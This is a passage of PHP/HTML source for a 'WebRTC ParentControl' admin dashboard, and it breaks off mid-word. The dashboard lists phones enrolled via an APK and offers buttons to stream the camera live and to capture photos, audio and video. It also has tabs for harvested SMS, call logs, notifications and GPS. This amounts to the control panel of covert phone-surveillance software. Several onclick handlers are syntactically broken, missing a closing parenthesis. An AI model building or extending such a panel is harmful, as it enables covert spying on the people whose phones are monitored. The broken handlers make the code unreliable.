<?php
session_start();
require_once 'config.php';

if (!isset($_SESSION['admin_id'])) {
    header('Location: login.php'); exit;
}

try {
    $pdo = new PDO(
        'mysql:host=' . DB_HOST . ';dbname=' . DB_NAME . ';charset=utf8mb4',
        DB_USER, DB_PASS,
        [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
    );

    // Auto-cleanup expired media
    $pdo->exec('DELETE FROM media_captures WHERE expires_at IS NOT NULL AND expires_at < NOW()');

    // Stats
    $totalDevices = $pdo->query('SELECT COUNT(*) FROM devices')->fetchColumn();
    $totalImages  = $pdo->query("SELECT COUNT(*) FROM media_captures WHERE media_type='image'")->fetchColumn();
    $totalAudios  = $pdo->query("SELECT COUNT(*) FROM media_captures WHERE media_type='audio'")->fetchColumn();
    $totalVideos  = $pdo->query("SELECT COUNT(*) FROM media_captures WHERE media_type='video'")->fetchColumn();

    $devices = $pdo->query('SELECT * FROM devices ORDER BY last_seen DESC LIMIT 50')->fetchAll(PDO::FETCH_ASSOC);
    $media   = $pdo->query('SELECT * FROM media_captures ORDER BY captured_at DESC LIMIT 30')->fetchAll(PDO::FETCH_ASSOC);
} catch (PDOException $e) {
    die('<h2 style="color:red">DB Error: ' . htmlspecialchars($e->getMessage()) . '</h2>');
}

// FIX Bug 13 — Use json_encode to safely escape NODE_BACKEND_URL into JS
$nodeUrlJs = json_encode(NODE_BACKEND_URL);
$uploadToken = defined('UPLOAD_TOKEN') ? json_encode(UPLOAD_TOKEN) : json_encode('');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>WebRTC ParentControl Dashboard</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<style>
  * { box-sizing:border-box; margin:0; padding:0; }
  body { font-family: 'Segoe UI', sans-serif; background:#1a1a2e; color:#eee; }
  .navbar { background:#16213e; padding:14px 24px; display:flex; justify-content:space-between; align-items:center; border-bottom:2px solid #e94560; }
  .navbar h1 { color:#e94560; font-size:20px; }
  .nav-links a { color:#aaa; text-decoration:none; margin-left:16px; font-size:14px; }
  .nav-links a:hover { color:#e94560; }
  .container { padding:24px; max-width:1400px; margin:0 auto; }
  .stats { display:grid; grid-template-columns:repeat(4,1fr); gap:16px; margin-bottom:28px; }
  .stat-card { background:#16213e; border-radius:10px; padding:20px; text-align:center; border:1px solid #0f3460; }
  .stat-card .num { font-size:32px; color:#e94560; font-weight:bold; }
  .stat-card .label { font-size:13px; color:#888; margin-top:4px; }
  .section-title { font-size:18px; color:#e94560; margin:24px 0 12px; border-bottom:1px solid #0f3460; padding-bottom:8px; }
  .device-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(260px,1fr)); gap:16px; }
  .device-card { background:#16213e; border-radius:10px; padding:20px; border:2px solid #0f3460; transition:border-color 0.3s; }
  .device-card.online { border-color:#27ae60; }
  .device-card h3 { font-size:14px; color:#eee; margin-bottom:4px; word-break:break-all; }
  .device-card .ts { font-size:11px; color:#666; margin-bottom:14px; }
  .btn-row { display:flex; flex-wrap:wrap; gap:6px; }
  .btn { padding:7px 12px; border:none; border-radius:6px; cursor:pointer; font-size:12px; font-weight:bold; }
  .btn-live  { background:#e94560; color:#fff; }
  .btn-photo { background:#3498db; color:#fff; }
  .btn-audio { background:#9b59b6; color:#fff; }
  .btn-video { background:#e67e22; color:#fff; }
  .btn-torch { background:#f1c40f; color:#333; }
  .btn:hover { opacity:0.85; }
  #live-section { background:#16213e; border-radius:10px; padding:20px; margin:24px 0; display:none; }
  #remote-video { width:100%; max-width:720px; border-radius:8px; background:#000; display:block; margin:0 auto; }
  .tabs { display:flex; gap:8px; margin-bottom:16px; flex-wrap:wrap; }
  .tab { padding:8px 18px; border-radius:6px; cursor:pointer; font-size:13px; background:#0f3460; color:#aaa; border:none; }
  .tab.active { background:#e94560; color:#fff; }
  .tab-content { display:none; }
  .tab-content.active { display:block; }
  .media-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(220px,1fr)); gap:14px; }
  .media-card { background:#0f3460; border-radius:8px; overflow:hidden; }
  .media-card img, .media-card video { width:100%; display:block; max-height:160px; object-fit:cover; }
  .media-card audio { width:100%; padding:8px; }
  .media-info { padding:10px; font-size:11px; color:#aaa; }
  .media-info .dev { color:#e94560; font-weight:bold; }
  .media-actions { display:flex; gap:6px; padding:0 10px 10px; }
  .media-actions a, .media-actions button { font-size:11px; padding:4px 10px; border-radius:4px; text-decoration:none; border:none; cursor:pointer; }
  .media-actions a { background:#27ae60; color:#fff; }
  .media-actions button { background:#c0392b; color:#fff; }
  #sms-feed, #call-feed, #notif-feed { max-height:400px; overflow-y:auto; }
  .sms-item, .call-item, .notif-item { background:#0f3460; border-radius:6px; padding:12px; margin-bottom:8px; font-size:13px; }
  .sms-item .from { color:#3498db; font-weight:bold; }
  .call-item .number { color:#27ae60; font-weight:bold; }
  .notif-item .app { color:#e67e22; font-weight:bold; }
  #gps-map { width:100%; height:400px; border-radius:8px; background:#0f3460; display:flex; align-items:center; justify-content:center; color:#888; }
  #gps-coords { font-size:13px; color:#aaa; margin-bottom:10px; }
  .status-bar { background:#16213e; padding:8px 24px; font-size:12px; color:#888; border-top:1px solid #0f3460; position:fixed; bottom:0; left:0; right:0; }
  .status-bar span { margin-right:20px; }
  #conn-status { color:#e94560; }
  @media(max-width:600px) { .stats { grid-template-columns:repeat(2,1fr); } }
</style>
</head>
<body>

<div class="navbar">
  <h1>📱 WebRTC ParentControl</h1>
  <div class="nav-links">
    <a href="#">Dashboard</a>
    <a href="logout.php">🚪 Logout (<?= htmlspecialchars($_SESSION['admin_user'] ?? 'admin') ?>)</a>
  </div>
</div>

<div class="container">

  <!-- Stats -->
  <div class="stats">
    <div class="stat-card"><div class="num"><?= $totalDevices ?></div><div class="label">📱 Devices</div></div>
    <div class="stat-card"><div class="num"><?= $totalImages ?></div><div class="label">📷 Images</div></div>
    <div class="stat-card"><div class="num"><?= $totalAudios ?></div><div class="label">🎤 Audio</div></div>
    <div class="stat-card"><div class="num"><?= $totalVideos ?></div><div class="label">🎬 Video</div></div>
  </div>

  <!-- Connected Devices -->
  <div class="section-title">📱 Connected Devices</div>
  <div class="device-grid" id="device-grid">
    <?php foreach ($devices as $dev): ?>
    <div class="device-card" id="card-<?= htmlspecialchars($dev['device_id']) ?>">
      <h3><?= htmlspecialchars($dev['device_id']) ?></h3>
      <div class="ts">Last seen: <?= htmlspecialchars($dev['last_seen'] ?? 'Never') ?></div>
      <div class="btn-row">
        <button class="btn btn-live"  onclick="startLive('<?= htmlspecialchars($dev['device_id']) ?>'">▶ Live</button>
        <button class="btn btn-photo" onclick="captureImage('<?= htmlspecialchars($dev['device_id']) ?>'">📷 Photo</button>
        <button class="btn btn-audio" onclick="captureAudio('<?= htmlspecialchars($dev['device_id']) ?>'">🎤 Audio</button>
        <button class="btn btn-video" onclick="captureVideo('<?= htmlspecialchars($dev['device_id']) ?>'">🎬 Video</button>
        <button class="btn btn-torch" onclick="toggleTorch('<?= htmlspecialchars($dev['device_id']) ?>'">🔦 Torch</button>
      </div>
    </div>
    <?php endforeach; ?>
    <?php if (empty($devices)): ?>
    <div style="color:#666; font-size:13px; padding:20px;">No devices connected yet. Install the APK on a device to begin.</div>
    <?php endif; ?>
  </div>

  <!-- Live View -->
  <div id="live-section">
    <div class="section-title">📺 Live View — <span id="live-device-label"></span>
      <button onclick="stopLive()" style="float:right;background:#e94560;color:#fff;border:none;padding:6px 14px;border-radius:6px;cursor:pointer;font-size:12px;">Stop</button>
    </div>
    <video id="remote-video" autoplay playsinline controls></video>
  </div>

  <!-- Data Tabs -->
  <div class="section-title">📁 Data & Media</div>
  <div class="tabs">
    <button class="tab active" onclick="switchTab('media')">📸 Media Gallery</button>
    <button class="tab" onclick="switchTab('sms')">💬 SMS</button>
    <button class="tab" onclick="switchTab('calls')">📞 Calls</button>
    <button class="tab" onclick="swi